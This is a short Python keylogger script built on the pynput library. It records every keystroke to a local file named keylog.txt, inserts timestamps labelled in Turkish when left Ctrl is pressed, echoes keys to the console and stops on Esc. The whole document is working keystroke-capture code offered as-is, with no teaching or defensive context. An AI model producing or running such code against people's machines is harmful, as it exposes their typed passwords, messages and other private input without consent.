import pynput
from pynput.keyboard import Key,Listener
import datetime
import threading

def on_press(key):
    print("{0} pressed".format(key))
    write_file(key)
        
def write_file(key):
    with open("keylog.txt" , "a" , encoding="utf-8") as file:
        k = str(key).replace("'", "")
        if k.find("enter")>0:
            file.write("\n")
        elif k.find("space")>0:
            file.write(" ")
        elif k.find("ctrl_l")>0:
            y = date_info()
            file.write(y)
        elif k.find("Key"):
            file.write(k)

def date_info():
    return " ---------TARİH ------- " + "\n" + str(datetime.datetime.now())

def on_release(key):
    if key == Key.esc:
        print("exit")
        return False
 
def run():
   listener = Listener(on_press = on_press, on_release = on_release)
   listener.start()
   listener.join()
        
if __name__ =='__main__':
    threading.Thread(target=run).start()
   
 
